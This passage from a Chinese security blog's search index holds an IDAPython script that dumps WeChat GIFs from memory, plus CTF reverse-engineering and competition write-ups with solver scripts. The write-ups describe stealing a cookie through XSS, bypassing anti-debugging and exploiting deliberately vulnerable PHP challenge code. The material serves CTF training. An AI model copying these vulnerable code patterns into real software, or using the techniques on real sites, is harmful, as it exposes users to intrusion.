Modules():     mod = idaapi.module_info_t()     result = idaapi.get_first_module(mod)     while result:         yield idaapi.object_t(name=mod.name, size=mod.size, base=mod.base, rebase_to=mod.rebase_to)         result = idaapi.get_next_module(mod)   class MyDbgHook(DBG_Hooks):     #GIF计数 \tcount = 0     #保存目录 \tsavepath = \"C:\\\\Users\\\\xxxxxx\\\\Desktop\\\\emotion\" \tkeyLocation = 0  \tdef dbg_process_start(self, pid, tid, ea, name, base, size):         #不要在这里插入断点 \t\t#for i in Modules(): \t\t#\tif 'WeChatWin.dll' in i.name: \t\t#\t\tprint \"module:[%s]\\tsize:[%#x]\\tbase:[%#x]\\tend:[%#x]\" %(i.name, i.size, i.base, i.rebase_to) \t\t#\t\tself.keyLocation = i.base \t\t#self.keyLocation += 0x247970 \t\t#AddBpt(self.keyLocation) \t\t#print 'keybreakpoint:[%#x]' % self.keyLocation \t\tprint \"MyDbgHook : Process started, pid=%d tid=%d name=%s\" % (pid, tid, name)  \tdef dbg_process_exit(self, pid, tid, ea, code):   \t    print \"MyDbgHook : Process exited pid=%d tid=%d ea=0x%x code=%d\" % (pid, tid, ea, code)  \tdef dbg_library_load(self, pid, tid, ea, name, base, size):   \t\tprint \"MyDbgHook : Library loaded: pid=%d tid=%d name=%s base=%x\" % (pid, tid, name, base)         # 对WeChatWin.dll下断点         if 'WeChatWin.dll' in name: \t\t\tself.keyLocation = base \t\t\tself.keyLocation = self.keyLocation + 0x1000 + 0x247970 \t\t\tAddBpt(self.keyLocation) \t\t\tprint 'keybreakpoint:[%#x]' % self.keyLocation  \tdef dbg_library_unload(self, pid, tid, ea, info):   \t    print \"MyDbgHook : Library unloaded: pid=%d tid=%d ea=0x%x info=%s\" % (pid, tid, ea, info) \t    return 0    \tdef dbg_bpt(self, tid, ea): \t\tprint \"MyDbgHook : Break point at %s[0x%x] pid=%d\" % (GetFunctionName(ea), ea, tid)         #是否到了关键的地址 \t\tif GetRegValue('eip') == self.keyLocation : \t\t\tlocation = GetRegValue('edi') \t\t\tsizeptr = GetRegValue('edi') + 0x4 \t\t\tprint \"[*]\\tGif location:[%08x],sizeptr:[%08x]\"% (location, sizeptr) \t\t\tstart = DbgDword(location) \t\t\tn = DbgDword(sizeptr) \t\t\tprint \"[*]\\tGif start:[%08x],n:[%08x]\"% (start, n) \t\t\tdump = DbgRead(start,n) \t\t\tf = open(os.path.join(self.savepath, str(self.count))+'.gif','wb') \t\t\tf.write(dump) \t\t\tf.close() \t\t\tself.count = self.count + 1 \t\telse: \t\t\tprint \"[%x] - [%x]\" %(GetRegValue('eip'),self.keyLocation)  \t\tidaapi.continue_process()   \t\treturn 0    \tdef dbg_suspend_process(self):   \t    print \"MyDbgHook : Process suspended\"  \tdef dbg_step_into(self):   \t    print \"MyDbgHook : Step into\" \t    self.dbg_step_over()  debughook = MyDbgHook()   debughook.hook()  print \"ok\"   写在最后   通过ida python实现了获取微信GIF的功能，自动化脚本，加载模块自动下断，dump文件。只需要在手机上发送GIF，保存目录下就能得到对应的GIF。速度可以说是很快的。   战果     ","categories": [],
        "tags": ["idapython"],
        "url": "https://zjgcjy.github.io/posts/2018-08/IDApython%E5%AE%9E%E7%8E%B0dump%E5%BE%AE%E4%BF%A1GIF%E8%A1%A8%E6%83%85%E5%8C%85.html",
        "teaser":null},{
        "title": "2018cumtctf逆向出题思路",
        "excerpt":"     初赛刚刚结束，总体来说，这一次比赛re的难度不大，后面几个题难度也只是中等偏容易。我主要考虑到受众有许多17级的同学(可能是想多了-_-)，出这几个题目的时候，没有为难大家。本来以为后面几个题能困倒大家，没想到还是有大佬冲了出来，倍感欣慰，看来我差不多也该退役了。以下是我出题的思路：       多框架   多语言   算法简单   解法多样   32位Release版本   无加壳保护   无混淆代码   基本无反调试   A piece of cake - 50      As the title said. Nothing else.    VS2012编译 C语言 Release版本 32位   签到题，不用多说吧。   解法   解法如下图所示，或者你用IDA之类的逆向工具打开就能看到了。   (若有童鞋不懂稍微讲一下：将输入字符串和flag进行比较，正确就Congratulations)      cumtctf{We1cOme_t0_cUmtCtf_IeVe1_0ne_SO_eaSy!}   Uncomplicated - 50      Probably, this is the most common algorithm in software reversing.    VS2012编译 C语言 Release版本 32位   入门签到题，如果是刚入门的同学的话，第一次做这个可能有点吃力。正如题目所说的，该算法是逆向工程中最常见的算法，其实更是密码学最常见算法之一，那就是异或⊕或者叫模2加法，其基于的原则就是 二进制不带进位加法运算：      0+1=1   0+0=0   1+0=1   1+1=0   回到题目中来，我们直接使用IDA分析程序，自动分析完成后，因为大部分同学不懂汇编，这里我就直接F5看伪C代码了。      上图所示的是输入部分，可以看到对输入字符串的每一个值循环和i进行异或操作，将结果保存在cinXor中。下面将判断输入的字符串是否正确。      上图所示的就是比较的部分，实际上这段代码是memcmp函数的具体实现。先取出两个数组的首地址，逐个比较，变量每次加四代表比较的大小是一次32位，也就是4字节。最后才进入if判断条件，比较最后2个，所以很明显，比较长度是4的倍数余2。   解法   为了获取需要对比的字符串，我们查看该flag变量。如下图所示。      现在我们需要做的就是将该数组的每个值，和i异或就行了。用python写脚本求解。   #coding:utf-8 __author__ = 'zjgcjy'  flag ='' strXor = \"\\x63\\x74\\x6f\\x77\\x67\\x71\\x60\\x7c\\x50\\x39\" \\          \"\\x78\\x54\\x3d\\x7e\\x51\\x6c\\x20\\x7c\\x5f\\x5c\" \\          \"\\x7a\\x4a\\x22\\x79\\x7c\\x46\\x74\\x2b\\x68\\x42\" \\          \"\\x76\\x2b\\x52\\x45\\x7d\\x51\\x15\\x42\\x4e\\x53\\x17\\x54\"  for index, ch in enumerate(strXor): \tflag += chr(index ^ ord(ch)) print flag  由此得到flag。   cumtctf{X0r_1s_c0mMOn_4nd_n0t_h4rd_r1ght?}   re0: beginning - 100      Watch out the order please.    VS2012编译 C语言 Release版本 32位   这题才算是一个逆向的题目，不过也很简单，平时比赛的话最高50分。 使用IDA分析好了。      就主函数中对输入进行了操作，通过上图我们可以看到，当输入字符串长度是36时，将每四个作为一组。高位的作为高位，低位的作为低位。意思就是说，将4个8bit的char变量转成1个32bit的int变量，其中高地址存放高字节，而且左移8位不会影响其低字节，最后和0x12341234异或，再和flag进行比较。然后我们来查看一下flag变量。      解法   知道了过程写脚本就容易了。   #coding:utf-8 __author__='zjgcjy' import binascii  array = [0x75557E52,0x2351454F,0x57592257,0x4D7B466B,0x4D515A40,0x77427766,0x7C582746,0x22434D53,0x6F503346] result = '' for i in xrange(len(array)): \tresult += binascii.a2b_hex(hex(array[i] ^ 0x12341234)[2:])[::-1] print result   由此得到flag。   flag{We1c0mE_TO_tHe_Rever5lng_w0r!d}   Stay in observation - 150      Well, you ought to be familiar with this language.    VS2012编译  C# .Net Framework4.0 Release版本 64位   这是一道.Net逆向，考虑到很多同学没有接触过C#，所以我给了150分，其实和Java是差不多的，一个是CLR，一个是JVM。其中的算法也很简单，我没用加壳进行保护，所以用.Net的工具就能直接看到源码了，甚至能动态调试。做出来这道题目的同学主要的思路有2种，和我预想的差不多。      使用动态调试，获取鼠标的位置，根据题目手动修改，之后自动解密出flag。   不用动态调试，直接看后面的解密代码，发现是AES，写脚本解出flag。   既使用调试，同时又跟踪AES，最后发现，flag被自动解出来了。WoW!   解法   调试的方式我就不说了，这里我将一下第二种方式。题目我是用了一张图片，检测鼠标的点击事件，当点击三次后。进行判断，点击的位置和规定的位置是否相同，这里的3个位置是我随机选的，所以用户点击一次就成功的可能性是个极小概率事件，更别说3次了。当判断不同时，直接弹框失败，否则进入MIX类中的Crypt方法进行解密。下面我们来看一下这个MIX类。      可以看到，该类中定义了一个计算MD5的方法，和一个解密的方法，当然还有一共byte转string的方法，这里没有列出来。其实这个MD5方法根本没有用到，就是混淆视听用的，而下面的System.Security.Cryptography.RijndaelManaged类就是Rijndael密码算法，也就是AES。下面直接写脚本解AES就行了。   #coding:utf-8 @需要Crypto库支持 __author__='zjgcjy' from Crypto.Cipher import AES from base64 import *  IV = \"Oityj1sok1yksiWeqtddYQ==\" key = \"epWRCdxC79zuea4ZnxEacCMMmIzo0tn/Ah+ENEWOYOY=\" c = \"NAaswR+u94wyIGDUifYSIfznIt0VXoR/NWoJoSjyWJ0=\"  cipher = AES.new(b64decode(key), AES.MODE_CBC, b64decode(IV)) plain = cipher.decrypt(b64decode(c))  print plain   注意该AES有IV，可能是CBC、CFB、OFB三种模式，而在C#中，有IV情况下又未指定模式，一般是指CBC模式，由此得到flag。   flag{reVer5e_1n_C5harP_or_ae5}   Shuttle - 200      Randomization is not terrible, trust me.    VS2012编译 C语言 Release版本 32位   C语言写的控制台程序，直接用IDA吧，打开后主函数流程如下。      先输入字符串，没什么好说的，但是看下面。很明显，这里用了rand函数，同时加入了时间作为种子，产生4个伪随机数作为密钥key。      再来看接下来的步骤，用随机的key当作密钥流和数组进行异或，最后和flag进行比较，若相等则Congratulations。 所以我们要做的就是爆破一个4字节的key，然后和原始数组进行亦或，最后得到一个有意义的字符串。脚本如下。   解法   # coding:utf-8 __author__='zjgcjy' import re import string import itertools as its #[0-9a-zA-Z_]{23,} words = string.lowercase table = [0x33,0x11,0x1a,0x1c,0x2e,0x1d,0x2b,0x49,0x12,0x2f,0x1,0x4d,0x4,0x1c,0x11,0x2b,0x12,0x2f,0x3d,0xb,0x8,0x4,0x2b,0x47] r = its.product(words,repeat=4) for i in r: \tkey = \"\".join(i) \tflag =\"\" \tfor i in xrange(len(table)): \t\tflag += chr(table[i] ^ ord(key[i%4])) \tif re.search('[0-9a-zA-Z_?]{24,}',flag) and flag.count('_')&gt;3: \t\tprint key,flag   有几点需要注意。      key一般是可见字符，而后期我放了提示说key是字母，这里爆破的范围可以减少，可以分别爆破小写和大写尝试。   更明显的是，flag中只会包含数字、大小写字母和以下划线为代表的特殊字符，所以这里可以结合正则表达式求解。   正则表达式的条件不唯一，这里也需要试多次，一开始可以试[0-9a-zA-Z_]{23,}，发现最后一位只有=&gt;?三种情况了，再分别尝试，同时可以结合下划线出现次数来提高效率。   最后得到flag如下。   flag{RandOm_1s_u5eleSs_Isit_?}   Symmetric Cipher - 250      Have you ever heard of Microsoft Foundation Classes ?    VS2017编译 MFC 静态链接 Release版本 32位   这道题是一个MFC的程序，由于是静态链接，程序体积很大，有3MB多。在如此大量的代码下能找到关键的Check函数是比较重要的。 这里我贴上关于MFC如何交叉应用查找控件ID的方法，也是由唐师傅在暑假培训的时候讲过的内容。想要深入的同学需要自己学习了，这里我就详细讲了。   基于MFC的教程1 基于MFC的教程2 基于MFC的教程3   解法   现在我们打开IDA，追踪到该关键函数。IDA自动生成的sub_402510函数则是确定按钮点击的消息处理，但是一开始确定按钮是点击不了的，原因是长度不满足条件，具体的条件则在sub_4024C0中，如下图所示。      也就是说，当输入字符串长度是30的时候，确定按钮将被激活，即flag长度是30。   所以现在我们再来看sub_402510函数的流程。如下图所示。      可以看到，点击确定后，首先进行反调试，若程序正在被调试，则直接退出。   mov     ebx, large fs:30h mov     eax, [ebx+68h] cmp     eax, 70h   关于该反调试的原理，很简单。相当于是自己实现简单的反调试检测，和微软的API接口IsDebuggerPresent()有点不同的是：IsDebuggerPresent()是通过访问程序PEB的BeingDebugged标志检测反调试。而该段汇编是通过检测NTGlobalFlag，是PEB结构偏移量0x68处的一个未公开位置，该位置决定了程序在调试和正常情况下不同的创建内存堆的方式。如果是0x70，则程序正在被调试。要跳过的方式很简单，直接nop判断方法或者改跳转(汇编模式下操作)。当然这个题我不是考大家这个的。我们直接进入Check函数好了。      有点基础的同学进入这个函数就能发现下面会有一个rc4的加密。而密钥流由National_Basketball_Association来生成。这里我就不多说了，上面的截图是rc4的KSA函数，先将密钥流初始化，再进行混乱。      接下来就是rc4的第二部分，伪随机生成密钥流并和字符串进行异或，得到密文。如上图所示。之后的代码就是比较了，这里不多说了。 由于rc4加密和解密是同一个函数，解密时，我们只需要将密文通过同一个key即可恢复得到明文了。下面是程序中的常量字符串，可能有童鞋没找到，我这里列出来了。      这里我直接引用Orzk队的脚本了，也可以自己写，不是很难。      最后得到flag如下。   cumtctf{Mfc_1s_VerY_difflcUIt}   Windows Cracker - 300      Would you want to be a Windows craker ? Try your best !!!    VS2012编译 Windows 动态链接 Release版本 32位   最后一题是一个Windows下的GUI程序，程序本身很简单，就是弹出一个对话框，根据输入计算flag。主要还是找到Check函数，但是这个程序本身很小，你也可以一个一个找，很快也能找到-_-。关于Win32程序是如何加载的，推荐大家看windows系列的书籍，里面会详细讲。我简单说明一下。首先看一下程序中所有的字符串常量，相关的函数也可以在这里查找交叉引用。      其次我们从主函数开始分析。      要注意，GUI程序是从WinMain开始的，首先是定义注册窗口类并调用RegisterClassW()，其次就可以依据该窗口类来创建窗口，调用CreateWindowExW()，之后开始进入整个消息循环中，进行消息的分发与更新。而整个框架中最重要的是注册窗口类的回调函数，也就是窗口过程。他是tagWNDCLASSW结构体中的lpfnWndProc，函数类型为WNDPROC 。      窗口过程的参数与分别是窗口句柄，消息标识符，2个DWORD的消息参数。在这个程序中，窗口过程首先接受WM_CREATE消息，进行窗口控件的创建，即上图中的case 1的情况，创建了一个文本框和一个确定按钮。对于确定按钮，定义了HMENU参数是250。控件ID和HMENU是共用的，当作为子窗口时，往往不需要菜单，该值用来区分控件。而对于接受到的按钮子窗口的WM_COMMAND消息，wParam参数的低位是子窗口ID，高位是消息，lParam参数是接收消息的子窗口的句柄。      一句话，也就是说在点击按钮后，产生wParam消息的低位是250，直接进入sub_401350()函数中进行判断。下面我们来看一下这个函数。      可以看到，直接调用GetWindowTextA()API来判断输入长度，当输入长度不是41的时候，直接通过SendMessageW()向窗口过程发送消息，且wParam参数是1111，我们回到窗口过程可以看到，此时会直接调用MessageBoxW(hWnd, L\"flag错误\", L\"FAIL\", 0x40u)即弹框，flag错误。所以我们可以确定flag长度就是41。接下来进入核心的Check函数验证算法。      看着很简单，其实不然。其中的loc_401050是一大段汇编，由于IDA反汇编插件出错，是需要看汇编的。   这种情况经常会有，请大家习惯看汇编，而且F5经常会出错   当然这题是我手动造成的情况，由于IDA采用了递归下降的扫描方式，想要让其出错并不难。请大家自己移步到链接。   线性扫描算法分析 递归下降算法分析   知道了这些后，直接nop部分指令就行了。出错的位置是.text:00401050和.text:004010B6，之后需要手动建立函数。最后函数流程如下图所示。发现就是不停的取第二个参数的2个值，然后相加放在第一个参数列表中。      下面我们重新回到Check函数，重新反编译，如下图所示。      第一步，进入第一个函数sub_401000分析。这里我就不贴图了，这个函数没有什么实质的作用，就是把原来的字符串进行打乱，类似于第二个密钥是0的仿射密码，左右两端同时进行。cinShuttle[(i * 33) % 41] = cin[(i * 23) % 41] 打乱后进入第二个函数，而第二个函数就是不停的相加，就结束了。最后是用strcmp和flag进行对比。   解法   既然核心的算法都求出来了，逆向就变得比较简单了，所以我们就是要先逆向sub_401050()这个函数，之后再将顺序还原。      第二个函数创建了41个加法等式，就构成了一个41元一次方程组，且线性无关，只有唯一解。只需要解方程即可。   第一个函数的逆向，如果看出来是单表代换密码，直接求33模41的逆元和23模41的逆元，即可还原明文。            如果看不懂移位怎么逆向，直接输入有序数组，动态调试，打印出结果，构建一一映射关系。       如果即看不懂，也不会动态调试，那就直接爆破，在不考虑逆元是否存在的条件下，也只需要爆破41*41次。           下面贴出我的解法，这里解41元方程组使用python的z3库来求解，当然同样可以使用Mathematica，或者python的numpy库来求解。   #coding:utf-8 __author__='zjgcjy' import binascii from z3 import *  def solver(): \tres = '' \tcipher = \"97b1c8cdd5d29694b8b4c5daa471718fbe94a4d0def3d5d4d4c4d9e5c1c4d5daf4e7c1bed7c196646a\" \tmat = [Int('mat%d'% i)for i in xrange(41)] \tauth = [ord(i) for i in binascii.a2b_hex(cipher)] \ts = Solver() \ts.add(And( \t\tauth[0] == mat[7] + mat[24], \t\tauth[1] == mat[24] + mat[0], \t\tauth[2] == mat[0] + mat[17], \t\tauth[3] == mat[17] + mat[34], \t\tauth[4] == mat[34] + mat[10], \t\tauth[5] == mat[10] + mat[27], \t\tauth[6] == mat[27] + mat[3], \t\tauth[7] == mat[3] + mat[20], \t\tauth[8] == mat[20] + mat[37], \t\tauth[9] == mat[37] + mat[13], \t\tauth[10] == mat[13] + mat[30], \t\tauth[11] == mat[30] + mat[6], \t\tauth[12] == mat[6] + mat[23], \t\tauth[13] == mat[23] + mat[40], \t\tauth[14] == mat[40] + mat[16], \t\tauth[15] == mat[16] + mat[33], \t\tauth[16] == mat[33] + mat[9], \t\tauth[17] == mat[9] + mat[26], \t\tauth[18] == mat[26] + mat[2], \t\tauth[19] == mat[2] + mat[19], \t\tauth[20] == mat[19] + mat[36], \t\tauth[21] == mat[36] + mat[12], \t\tauth[22] == mat[12] + mat[29], \t\tauth[23] == mat[29] + mat[5], \t\tauth[24] == mat[5] + mat[22], \t\tauth[25] == mat[22] + mat[39], \t\tauth[26] == mat[39] + mat[15], \t\tauth[27] == mat[15] + mat[32], \t\tauth[28] == mat[32] + mat[8], \t\tauth[29] == mat[8] + mat[25], \t\tauth[30] == mat[25] + mat[1], \t\tauth[31] == mat[1] + mat[18], \t\tauth[32] == mat[18] + mat[35], \t\tauth[33] == mat[35] + mat[11], \t\tauth[34] == mat[11] + mat[28], \t\tauth[35] == mat[28] + mat[4], \t\tauth[36] == mat[4] + mat[21], \t\tauth[37] == mat[21] + mat[38], \t\tauth[38] == mat[38] + mat[14], \t\tauth[39] == mat[14] + mat[31], \t\tauth[40] == mat[31] + mat[7],)) \tfor i in xrange(41): \t\ts.add(mat[i] &gt; 0x20) \t\ts.add(mat[i] &lt; 0x80) \tif(s.check() == sat): \t\tm = s.model() \t\tfor i in xrange(41): \t\t\tres += chr(m[mat[i]].as_long()) \tprint res  if __name__ == '__main__': \tmain()   通过z3求解出结果是cao1iutIP_mlv_Ct0eyacn_0Nt5eU_f!q_h{}USeA。再求出33和23模41的逆元分别是5和-16，还原即可。   def decode(): \tmat = [i for i in xrange(41)] \tstr1 = r'''cao1iutIP_mlv_Ct0eyacn_0Nt5eU_f!q_h{}USeA''' \tfor i in xrange(41): \t\tmat[(i * 5) % 41] = str1[(i * (-16)) % 41] \tprint ''.join(mat)   最后得到flag。   cumtctf{Ai_CaN_he1P_y0U_SoIve_eqUatl0n5!}  ","categories": [],
        "tags": ["writeup"],
        "url": "https://zjgcjy.github.io/posts/2018-08/2018cumtctf%E9%80%86%E5%90%91%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF.html",
        "teaser":null},{
        "title": "2017cumtctf决赛 Writeup",
        "excerpt":"     本次比赛历时10个小时，我们队最终取得了第二名的成绩，还算不错吧。感谢3位队友的努力付出，也感谢各位学长的认真出题与提示（笑）。以下是我们队的writeup。本人才疏学浅,不周不对之处,望乞见谅。         MISC     CRYPTO     WEB     MOBILE     REVERSE     PWN      MISC   签到题   School song   使用16进制文本分析器直接打开wav文件，发现文件最后部分存在异常。   .../-/./--./..../../-.././-....-/.--./.-/.../.../-....-/../.../-....-/..-./.-../...-..-/--.   这是是一段摩斯电码，使用翻译器得到：STEGHIDE-PASS-IS-FL$G。说明wav文件采用steghide加密，密码为FL$G。   steghide extract -sf cumt.wav cumtctf{Lu0Ti@NY1_s0_Cut3}   Digital Image Processing 1   打开后，由题目意思和文件信息格式知道，这是一张图片，根据每个点的值，画出这张图片即可得到flag。在比赛中，我们认为图片格式是RGB，但是RGB只有3位，显然不对，但是使用RGB的Python脚本画图却成功了。但是图片颜色不对，只能说运气还不错吧。   #-*- coding:utf-8 -*- from PIL import Image import re x = 250 y = 250 image = Image.new(\"RGB\",(x,y)) f = open('cumt.txt') for i in range(0,x):     for j in range(0,y):         l = f.readline()         r = l.split(\",\")         image.putpixel((i,j),(int(r[0]),int(r[1]),int(r[2]))) image.save('image1.jpg')   得到flag。   cumtctf{CMYK_ExC1t3d}   Digital Image Processing 2   这道题，题目提示是傅里叶变换，由此想到数字水印，网上苦苦寻觅，只有matlab能处理，但是队友三人都没用matlab，无奈。最后使用photoshop进行简单的处理，依稀能看到flag，剩下的一位看不清，于是开始猜，虽然最后猜对了，但是提交时比赛已经结束。。。   cumtctf{666_to_you}   Hacker  本题给了个抓包文件，还有一个加密的zip。打开wireshark，追踪TCP，查看各文件头，存在一个linux下可执行文件，提取出来后找到zip密码为：int_main_bxs。解密zip后得到mini.pcap，打开继续分析，发现flag.tar.gz文件，仔细追踪TCP，在其中一个发现了该文件的文件头，恢复文件，得到flag.txt。   cumtctf{CaiDao_@nd_B4ckDoor_so_c00l!}   LSB Picture   这个题目首先给了个mp3，但是分析知道里面有个PNG文件，提取出来之后，首先根据题目意思LSB，分析了半天，没什么用，然后放了HINT，在mp3里面，也就是PNG文件最后，发现一段代码。。。   aHR0cHM6Ly9naXRodWIuY29tL2N5YmVyaW5jL2Nsb2Fja2VkLXBpeGVsKHBhc3N3b3JkOmZsYWcp   最后发现是Base64加密，解密后得到：   https://github.com/cyberinc/cloacked-pixel(password:flag)   然后去这个地址找工具。。。下载下来后。   python lsb.py extract 0.png-1.png flag   得到一个文件。名曰：LDR.asm。。。   00010554~00010674 E52DB004 E28DB000 E24DD01C E50B0018 E3A03000 E50B3010 EA000022 E3A03000 E50B3008 E3A03000 E50B300C EA000013 E51B300C E51B2018 E0823003 E5D33000 E1A00003 E59F10C8 E51B2010 E1A03002 E1A03203 E0433002 E51B200C E0833002 E7913103 E0030390 E51B2008 E0823003 E50B3008 E51B300C E2833001 E50B300C E51B300C E353000E DAFFFFE8 E59F1084 E51B3010 E51B2008 E7812103 E51B3010 E2833001 E50B3010 E51B3010 E353000E DAFFFFD9 E3A03000 E50B3010 EA00000C E59F2050 E51B3010 E7922103 E59F1048 E51B3010 E7913103 E1520003 0A000001 E3E03000 EA000006 E51B3010 E2833001 E50B3010 E51B3010 E353000E DAFFFFEF E3A03000 E1A00003 E24BD000 E49DB004 E12FFF1E 00021034 00021400 000213B8 ================= 0002102C~0002146C 00000000 00000000 00000024 0000000E 00000011 00000020 00000008 00000006 00000001 0000000C 0000004C 00000055 00000031 00000012 00000039 00000002 00000002 00000021 00000010 00000010 0000001E 00000006 00000004 00000002 0000000A 00000048 00000054 0000002F 00000013 00000039 00000001 00000001 0000001C 0000000F 0000000F 0000001B 00000006 00000004 00000001 00000009 00000040 0000004D 0000002B 00000012 00000035 00000001 00000002 00000013 0000000C 0000000B 00000013 00000005 00000001 00000001 00000005 0000002B 00000037 0000001C 0000000E 00000027 00000001 00000001 00000019 0000000A 0000000B 00000014 00000006 00000004 00000001 00000008 00000031 00000037 0000001E 0000000D 00000026 00000001 00000001 0000001A 0000000E 0000000F 0000001B 00000004 00000005 00000000 0000000B 0000003F 0000004D 0000002C 0000000F 00000033 00000003 00000003 0000001F 00000010 00000010 0000001C 00000007 00000002 00000002 00000008 00000042 0000004F 0000002A 00000013 00000037 00000001 00000001 0000000F 00000006 00000008 00000010 00000002 00000002 00000000 00000005 00000025 00000029 0000001A 00000007 0000001A 00000001 00000001 00000028 0000000C 00000011 00000021 00000007 00000007 00000002 0000000D 00000051 00000053 00000033 00000010 00000036 00000001 00000001 00000023 0000000C 00000011 00000020 00000006 00000006 00000001 0000000C 0000004C 00000052 00000032 0000000F 00000035 00000002 00000002 00000018 00000008 0000000B 00000015 00000004 00000004 00000001 00000008 00000033 00000036 00000021 0000000A 00000023 00000001 00000001 0000001E 0000000E 0000000D 00000019 00000007 00000002 00000002 00000007 0000003D 00000046 00000026 00000012 00000031 00000000 00000000 00000020 0000000E 00000010 0000001C 00000007 00000003 00000002 00000008 00000044 0000004D 0000002C 00000012 00000035 00000000 00000002 0000001D 0000000F 0000000F 0000001B 00000007 00000005 00000001 0000000A 00000040 0000004E 0000002A 00000012 00000036 00000002 00000003 00000020 0000000E 00000011 0000001C 00000007 00000003 00000002 00000008 00000044 0000004D 0000002C 00000012 00000035 00000000 00000003 00008ED1 00008921 00007CD8 0000570C 00005D87 00007B78 0000800E 0000428D 00009065 00008A65 00005BCF 00007343 00007FB0 00007F03 00008055 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000   显然是一个ARM汇编，但是鄙人不懂ARM平台汇编。更不用说直接给机器码和数据了。（学长够狠的，一个LSB出成这样。。。）   CRYPTO   Base   都说是base了，先将hex转成text，再base64解密   54553479567A493152455250556C524956314655516B394E576C593257564E4254303554566A5A4F56454A48566C4E594D6A303950513D3D -&gt; TU4yVzI1RERPUlRIV1FUQk9NWlY2WVNBT05TVjZOVEJHVlNYMj09PQ== -&gt; MN2W25DDORTHWQTBOMZV6YSAONSV6NTBGVSX2===   最后出现3个=，应该不是base64了，推测是base32   MN2W25DDORTHWQTBOMZV6YSAONSV6NTBGVSX2=== -&gt; cumtctf{Bas3_b@se_6a5e}   我都不好意思说这是加密   密文最后有6个等号，肯定不是base64了，是base32   OFQXC5DTM5PWG6LSMJPWQ2LINB5W63LLMZPWG43XPU====== -&gt; qaqtsg_cyrb_hihh{omkf_csw}   这又是常见的套路。一般就是栅栏，凯撒，最多还有ROT13这几个混着用。。。   qaqtsg_cyrb_hihh{omkf_csw} -&gt; qiahqht{sogm_kcfy_rcbs_wh} -&gt; cumtctf{easy_work_done_it}   超超超简单的RSA   题目很明显给出了rsa的攻击，打开文件发现两个txt文档，打开任意一个文档发现里面均存在有n 与 e，所以知道本题目是两个rsa文件（即两个被加密的文件），所以想办法得到每个文件的私钥才可以解题。对第一个A文本中的n用质数分解发现分解不出来（对了，我不懂16进制怎么去处理，所以用py全部转成10进制了，花了一些时间。。。。）所以很复杂。想了好久猜想两个文本A与B中的N也许有联系，所以用py处理了一下两个质数得出了他们的最大公约数，所以以这个公约数C作为P，即得出Q=N/P。有P有Q然后用小工具（下图）得出私钥D。   之后有私钥利用A文本里给的公钥与小工具,将密文等数据填写进去得到 即明文得出来了。不过B文件的内容我没有去尝试解，大家可以去解下试试。   模数 N=29418132766062200053827508724246843105374637443595563658353636901180985530454564748758954022059769968982002140853896779902444989762754829021500174009685317744797202131791952882245156752602275951380571602331788950944361654561540811865247443070852205987517914882270234145588910167329180689201693364463939325045996426086956404110646487321752453515607959864012257125599952218384912758492278760212475418527633763779623723297398616758881690569134708160861225121310386258262233845349929832236096958219199090596331413929196303615488618826471077896979729621018914864133480510063685383380281751344618122905355446455152052146107   私钥D=5276569622169127583335396030174609377842679457826382876886732018555136943898524693377979534161711823815512184943455864784707258401816484897185891483275856469930223821580727295178409526710404020255132334411694676322006535535546302259515681376235707488042647120486202926845339494431016269464963898657451334903848837250871373477682894250164643619602539540167941126569254100541247071088029518267294673136150590137761627750871598184521964595130415894447450203665799780203794291800387632230796502586420060307704968798926230993933417456137261862838342423360539764609700124237130276870839075369086314306378124788811184527308864016188670758147951657948794726339811014447072181868238689002340820729878182691215125098872623119560093174867103561051579057   密文=16100055693360522322921904559463506095804777561229411389210562116776123887118032506500785234735650863266120870039583905903640748310769171758726776231272365756600955133373377424528798613667972612939112952739492634777392213118214538310023716791113397548161112585724810411650439986941834109983323315567262092245187889800878232402966804760965881216269022049586892968822789422135384021734622276346902887808132752808716548024992278042957487218505559297871159990210141047554025964806293617142183951888549982800751775892257499574146183538611011708642419473426914866890982026974237403676735705451473230887885053941067076232393 公钥e=0x10001   此外，根据A和B文本得到的最大公约数Q=176619317803996218465829943540526296076867590914430196106340551568870328156449028441778892112662362916940116161090362718242443676528799588976770654437504474997568793583909264900680213577430229171890593572386841798207200784823655954364900051437142324539709060542879468781584230692448457677803389650254712030259   P=166562373424571003644969210886957594935507861087984296297058666148455412078457690109851370986660882279126361524191566223822671452404569269819830903808012097953053534590353386995492143954050309296677311577678675327620326594657482392410288368865181591208513290907483245868756146614333721689500461074105692470873   cumtctf{GCD_is_Useful_in_Rsa}   WEB   暴打出题人  上来给了一个留言板,然后提示用XSS平台.网上找了一个XSS平台,通过最简单的使用得到了cookie。在最开始的留言板的页面加入XSS平台得到的cookie即得flag。   just trick   这个题涉及到几个小技巧      首先进入页面查看源代码得到的提示,然后打开这个文本得到代码。   &lt;?php echo \"&lt;!--index.txt--&gt;\"; if(!$_GET['id']) {     header('Location: index.php?id=1');     exit(); } $id=$_GET['id']; if($id==0)   {       if(isset($_COOKIE['token']))       {         $key=$_GET['key'];         $token =$_COOKIE['token'];         if(isset($key)&amp;&amp;(file_get_contents($key,'r')===\"I want flag!!!\"))         {           echo \"hello Hacker!&lt;br&gt;\";           include(\"include.php\");           echo cumtctf_unserialize($token);         }         else         {             echo \"You are not Hacker ! \";           }         }   } ?&gt;      PHP中可以看到首先get方式提交一个id的值,在if(!$_GET[‘id’])的地方需要值不为空跳过if,后面if($id==0)的地方需要id的值为0进入if,如果id=0第一个if语句无法跳过,所以让id=’0’这两个地方就都能过去.   看到需要get方式提交一个key.想让file_get_contents($key,’r’)===”I want flag!!!”可以用PHP的封装协议php://input,它可以得到原始的POST数据.   这里我想了好久怎么才能看到include.php的内容= =,也没有文件包含什么的,最后发现和看index.php一下,看一下include.txt就得到了内容。   &lt;?php echo \"&lt;!--include.txt--&gt;\"; class Read{//flag.php     public $file;     public function __toString(){          if(isset($this-&gt;file)){             if(\"flag.php\"===$this-&gt;file||stripos($this-&gt;file,\"://\")&gt;-1)             {                 exit();               }             else             {                 echo file_get_contents($this-&gt;file);             }                       }         return \"you are big Hacker\";     } } function cumtctf_unserialize($value)     {         preg_match('/[oc]:\\d+:/i', $value,$matches);         if(count($matches)){             return false;         }         return unserialize($value);     }  ?&gt;      